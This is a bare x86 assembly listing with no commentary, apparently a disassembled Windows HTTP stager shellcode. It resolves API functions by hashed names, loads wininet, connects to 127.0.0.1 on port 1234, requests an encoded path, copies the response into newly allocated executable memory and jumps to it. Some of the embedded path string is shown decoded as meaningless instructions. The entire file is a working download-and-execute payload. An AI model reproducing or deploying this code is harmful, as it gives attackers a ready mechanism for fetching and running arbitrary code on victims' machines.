```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    mov ebp, esp
    xor edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
    jmp L_15
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
    jmp L_27
L_15:
    xor edi, edi
    mov esi, dword ptr [edx + 0x28]
    movzx ecx, word ptr [edx + 0x26]
    jmp L_1e
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    push edi
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    mov ebx, dword ptr [eax + 0x20]
    push eax
    add ebx, edx
    jmp L_4b
L_4b:
    test ecx, ecx
    je L_8b
    xor edi, edi
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
    jmp L_57
L_57:
    xor eax, eax
    lodsb al, byte ptr [esi]
    ror edi, 0xd
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
    jmp L_8c
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x74656e
    push 0x696e6977
    push esp
    push 0x726774c
    call ebp
    xor ebx, ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    jmp DATA_STUB_0
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
L_12a:
    push 0xa779563a
    call ebp
    push ebx
    push ebx
    push 3
    push ebx
    push ebx
    push 0x4d2
    call L_1f5
    das
    push esp
    dec edi
    dec esi
    inc ebx
    xor eax, 0x54684943
    inc esi
    dec edi
    jae L_183
    dec ebx
    xor ebp, dword ptr [eax + 0x78]
    dec edi
    jae L_1a6
    dec ebp
    ja L_1c4
    bound esp, qword ptr [ecx + 0x6c]
    jo L_195
    push 0x70
    inc ebx
    push ebp
    jno L_1b2
    dec eax
    push eax
    sub eax, 0x654b506c
    inc esi
    js L_1e2
    add byte ptr [eax + 0x68], dl
    push edi
    mov dword ptr [edi - 0x762a003a], ebx
L_179:
    .byte 0xc6, 0x53, 0x68, 0x00, 0x02, 0x68, 0x84, 0x53, 0x53, 0x53
L_183:
    .byte 0x57, 0x53, 0x56, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x96, 0x6a, 0x0a, 0x5f, 0x53, 0x53, 0x53, 0x53
L_195:
    .byte 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x75, 0x14, 0x68, 0x88, 0x13, 0x00, 0x00
L_1a6:
    .byte 0x68, 0x44, 0xf0, 0x35, 0xe0, 0xff, 0xd5, 0x4f, 0x75, 0xe1, 0xe8, 0x50
L_1b2:
    .byte 0x00, 0x00, 0x00, 0x53, 0x89, 0xe0, 0x53, 0x89, 0xe7, 0x57, 0x6a, 0x04, 0x50, 0x56, 0x68, 0x12, 0x96, 0x89
L_1c4:
    .byte 0xe2, 0xff, 0xd5, 0x5b, 0x5b, 0x85, 0xc0, 0x74, 0xe3, 0x31, 0xc0, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x53, 0x50, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0x53, 0x53
L_1e2:
    .byte 0x89, 0xe7, 0x57, 0x50, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xbd, 0x58, 0xc3
L_1f5:
    .byte 0x5f, 0xe8, 0x75, 0xff, 0xff, 0xff, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x00, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x6a, 0x00, 0x53, 0xff, 0xd5
```